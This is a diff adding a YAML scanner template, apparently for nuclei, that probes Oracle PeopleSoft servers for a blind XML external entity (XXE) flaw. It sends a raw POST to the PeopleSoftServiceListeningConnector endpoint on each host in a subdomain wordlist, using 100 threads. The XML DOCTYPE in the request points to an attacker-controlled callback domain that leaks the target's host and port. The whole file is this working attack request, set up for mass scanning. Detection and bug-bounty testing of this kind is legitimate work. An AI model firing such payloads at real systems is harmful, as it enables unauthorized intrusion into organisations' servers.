@@ -1,0 +1,31 @@
+id: PeopleSoft-XXE-2
+info:
+  author: 0xAwali
+  description: PeopleSoft XXE , Commonly Bound Ports 80 - 443
+  name: PeopleSoft XXE
+  reference:
+  - https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#peoplesoft
+  - https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
+  severity: critical
+requests:
+- attack: sniper
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
+
+    Host: {{Subdomains}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: keep-alive
+
+    Content-Type: application/xml
+
+
+    <!DOCTYPE a PUBLIC "-//B/A/EN" "http://{{Host}}.{{Port}}.{{Subdomains}}.peoplesoft.{{MY-DOMAIN}}">'
+  threads: 100
